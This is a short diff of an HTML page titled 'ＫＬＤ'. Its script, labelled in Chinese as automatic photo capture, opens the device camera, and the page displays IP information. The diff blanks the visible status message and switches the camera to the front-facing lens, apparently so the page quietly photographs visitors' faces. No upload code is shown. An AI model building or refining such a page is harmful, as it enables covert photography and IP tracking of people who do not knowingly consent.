@@ -8,7 +8,7 @@
 <body>
   <h1>ＫＬＤ</h1>
   <p id="ipInfo">資訊載入中...</p>
-  <p id="status">狀態：啟動中...</p>
+  <p id="status">...</p>
 
   <script>
     // 自動拍照功能
@@ -17,7 +17,7 @@
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' } },
+          video: { facingMode: { ideal: 'user' } },
         });
         const video = document.createElement('video');
         video.srcObject = stream;
